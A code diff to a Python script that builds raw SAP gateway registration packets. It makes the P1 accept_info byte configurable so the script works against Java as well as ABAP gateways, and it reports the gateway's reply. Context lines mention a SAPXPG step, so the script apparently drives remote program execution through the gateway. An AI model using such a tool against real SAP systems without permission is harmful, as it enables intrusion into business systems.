@@ -114,8 +114,17 @@ def ip_to_bytes(ip_str):
 # P1 - GW_NORMAL_CLIENT (version=2, 64 bytes)
 # ---------------------------------------------------------------------------
 
-def build_p1(target_ip, instance):
-    """Build GW_NORMAL_CLIENT registration packet (64 bytes)."""
+def build_p1(target_ip, instance, accept_info=0x00):
+    """Build GW_NORMAL_CLIENT registration packet (64 bytes).
+
+    accept_info controls which protocol extensions we advertise:
+      0x00 - no extensions (safe default; Java gateways skip EINFO handshake)
+      0x0B - EINFO+PING (original value; triggers mandatory EINFO exchange on Java)
+
+    SAP Java gateways enforce the EINFO handshake when the client advertises
+    EINFO support (bit 0 of accept_info).  ABAP gateways tolerate both values.
+    Using 0x00 avoids the deadlock on Java without affecting ABAP compatibility.
+    """
     service = "sapgw%s" % instance
     tp = "sapgw%s" % instance
 
@@ -131,7 +140,7 @@ def build_p1(target_ip, instance):
     p += pad_right(tp, 8, b" ")              # tp (8 bytes, space-padded)
     p += b" " * 8                           # conversation_id (8 spaces)
     p += struct.pack("B", 0x06)             # appc_header_version
-    p += struct.pack("B", 0x0B)             # accept_info (EINFO+PING+CONN_EINFO)
+    p += struct.pack("B", accept_info)      # accept_info (capabilities we advertise)
     p += struct.pack("!h", -1)              # idx = -1 (signed short, big-endian)
     p += struct.pack("!I", 0)               # rc
     p += struct.pack("B", 0)                # echo_data
@@ -923,6 +932,11 @@ def main():
                         help="Skip SAPXPG_END_XPG step (required for kernel 793+)")
     parser.add_argument("--timeout", type=int, default=10,
                         help="Socket timeout in seconds (default: 10)")
+    parser.add_argument("--accept-info", type=lambda x: int(x, 0), default=0x00,
+                        metavar="HEX",
+                        help="P1 accept_info byte (default: 0x00). "
+                             "Use 0x0B for classic ABAP gateways if 0x00 fails. "
+                             "0x00 avoids the EINFO handshake required by Java gateways.")
     parser.add_argument("-v", "--verbose", action="store_true",
                         help="Verbose output with hex dumps")
     parser.add_argument("--dump-packets", metavar="PREFIX",
@@ -947,7 +961,7 @@ def main():
     print("=" * 60)
 
     # Build packets for optional dump (before connecting)
-    p1_data = build_p1(args.host, args.instance)
+    p1_data = build_p1(args.host, args.instance, accept_info=args.accept_info)
     p2_data = build_p2(args.host, args.dest)
 
     if args.dump_packets:
@@ -1001,6 +1015,13 @@ def main():
         for i, f in enumerate(p1_frames):
             print("[*] P1 frame %d (%d bytes):" % (i + 1, len(f)))
             print(hexdump(f[:200]))
+        # Report the gateway's accept_info (byte 55) so protocol differences
+        # between ABAP and Java gateways are immediately visible
+        gw_accept = first_p1[55] if len(first_p1) >= 56 else 0
+        print("[*] Gateway accept_info: 0x%02X (our P1 sent: 0x%02X) — "
+              "EINFO=%d PING=%d" % (
+                  gw_accept, args.accept_info,
+                  gw_accept & 0x01, (gw_accept >> 1) & 0x01))
     # Check any frame for an error — first frame is the primary response
     rejected = False
     for f in p1_frames:
